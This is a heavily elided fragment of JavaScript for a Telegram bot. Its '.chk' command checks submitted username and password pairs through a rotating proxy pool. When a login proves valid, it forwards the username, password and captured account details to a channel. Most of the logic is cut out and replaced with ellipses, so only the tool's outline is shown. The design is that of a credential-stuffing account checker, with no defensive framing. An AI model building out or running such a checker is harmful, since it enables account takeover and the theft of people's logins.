...
async function initializeTelegramHandler(botToken, options = {}) {
  ...
  bot.command('stop', async (ctx) => {
    ...
    if (hasCombineSession(chatId)) {
      const { clearSession } = require('./combineHandler');
      clearSession(chatId);
  ...
  bot.hears(/^\.chk\s+(.+)/, async (ctx) => {
    ...
    try {
      ...
      if (coordinator?.proxyPool) {
        const assignment = await coordinator.proxyPool.assignProxy(`chk-${Date.now()}`);
        if (assignment) {
      ...
      // ── Local check (coordinator processes directly) ───────────────────────
      const processorInfo = {
        name: 'coordinator',
      ...
      // Record proxy health for the pool (local path)
      ...
      if (result.status === 'VALID' && result.session) {
        try {
          ...
          await forwardValidToChannel(ctx.telegram, creds.username, creds.password, finalMessage, capture);
        } catch (captureErr) {
      ...
      if (sessionToClose != null && sessionToClose.id) {
